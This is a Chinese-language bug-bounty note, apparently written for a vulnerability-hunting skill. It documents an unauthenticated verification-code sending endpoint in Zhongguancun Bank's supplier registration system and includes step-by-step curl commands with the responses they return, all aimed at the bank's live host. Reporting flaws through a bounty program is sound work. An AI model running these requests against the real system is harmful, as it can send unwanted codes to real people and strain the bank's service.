# 360 SRC / 中关村银行供应商注册链验证码发送接口实战补充 (2026-05-20)

适用技能: `src-vuln-hunting`

## 目标
- 厂商: 北京中关村银行
- 业务面: 采购管理系统供应商注册链
- 主域: `pms.zgcbank.com`
- 注册页: `https://pms.zgcbank.com/pms/ananymous/jyzt/zc/gyszc`
- VPN: 360 VPN，分流配置 `/home/zxy/360-vpn-split.ovpn`，tun0 常见地址 `10.9.235.78/16`

## 关键发现: 注册链验证码发送接口可被未登录公开会话触发
公开供应商注册页源码中 `sendmessage()` 会调用:
- `/pms/ananymous/jyzt/zc/getEmailSession`
- `/pms/ananymous/jyzt/zc/sendEmailYzm`

参数:
- `jsrzh`: 接收账号，可为邮箱或手机号
- `yzfs`: 验证方式，`1` 表示邮箱验证，`2` 表示手机验证
- `_csrf`: 公开注册页 meta 中的 CSRF 值

验证结果:
- 无 Cookie、无 `_csrf` 直接 POST `sendEmailYzm` → `403 Invalid CSRF Token.`
- 访问公开注册页获取 `SESSION` + `_csrf` 后，POST `getEmailSession` → `HTTP/1.1 200`，响应体为空
- 同一会话 POST `sendEmailYzm`，`jsrzh=test360@example.com&yzfs=1` → `HTTP/1.1 200`，响应体 `success`
- 短时间重复 POST 同一邮箱 → `HTTP/1.1 200`，响应体 `hassend`
- 同一方式测试 `jsrzh=13900000009&yzfs=2` → `HTTP/1.1 200`，响应体 `success`

结论: 接口不是静态假响应；`success` 与重复调用 `hassend` 可证明请求进入真实验证码发送业务逻辑和频率状态。报告定位为“供应商注册链邮箱/手机验证码发送接口未授权调用 / 逻辑漏洞 / 权限控制缺失”。

## 复现命令要点

1. 获取公开会话和 CSRF:
`curl -sk -c /tmp/reg.cookie -D /tmp/reg.hdr "https://pms.zgcbank.com/pms/ananymous/jyzt/zc/gyszc" -o /tmp/reg.html`

2. 提取变量:
`SESSION=$(grep -i 'Set-Cookie: SESSION=' /tmp/reg.hdr | head -1 | grep -oi 'SESSION=[^;]*'); CSRF=$(grep -oP '<meta name="_csrf" content="\K[^"]+' /tmp/reg.html | head -1); echo "$SESSION $CSRF"`

3. 无认证对照:
`curl -sk -D - -X POST "https://pms.zgcbank.com/pms/ananymous/jyzt/zc/sendEmailYzm" -H "X-Requested-With: XMLHttpRequest" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" --data "jsrzh=test360@example.com&yzfs=1"`

4. 初始化发送会话:
`curl -sk -D - -b /tmp/reg.cookie -c /tmp/reg.cookie -X POST "https://pms.zgcbank.com/pms/ananymous/jyzt/zc/getEmailSession" -H "Cookie: $SESSION" -H "X-Requested-With: XMLHttpRequest" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" --data "jsrzh=test360@example.com&dsjTimes=60&_csrf=$CSRF"`

5. 触发邮箱验证码:
`curl -sk -D - -b /tmp/reg.cookie -c /tmp/reg.cookie -X POST "https://pms.zgcbank.com/pms/ananymous/jyzt/zc/sendEmailYzm" -H "Cookie: $SESSION" -H "X-Requested-With: XMLHttpRequest" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" --data "jsrzh=test360@example.com&yzfs=1&_csrf=$CSRF"`

6. 手机验证方式:
`curl -sk -D - -b /tmp/reg.cookie -c /tmp/reg.cookie -X POST "https://pms.zgcbank.com/pms/ananymous/jyzt/zc/sendEmailYzm" -H "Cookie: $SESSION" -H "X-Requested-With: XMLHttpRequest" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" --data "jsrzh=13900000009&yzfs=2&_csrf=$CSRF"`

## 截图位置建议
- 【截图位置1】公开注册页提取 `SESSION`、`CSRF`，并展示 `getEmailSession/sendEmailYzm` 接口来源
- 【截图位置2】无 Cookie/CSRF 调用 `sendEmailYzm` 返回 `403 Invalid CSRF Token`
- 【截图位置3】未登录调用 `getEmailSession` 返回 `200`
- 【截图位置4】未登录调用 `sendEmailYzm` 返回 `success`
- 【截图位置5】重复调用返回 `hassend`，证明真实发送流程与频率状态
- 【截图位置6】手机验证方式 `yzfs=2` 返回 `success`

## 报告写作注意
- 这是注册链验证码发送接口，不要和登录页 `/checkSjh` 短信验证码接口重复混淆。
- 价值点是“不同入口、不同接口、不同业务链”: 登录页验证码接口属于登录认证链；本接口属于供应商注册链。
- 为避免骚扰真实用户，验证手机号时使用测试号/占位号，只证明接口返回和频率状态；如需更强证据，使用研究员自有邮箱或手机号。
- 风险级别建议中危；不要夸大为账号接管，除非进一步证明可绕过验证码完成注册或重置密码。
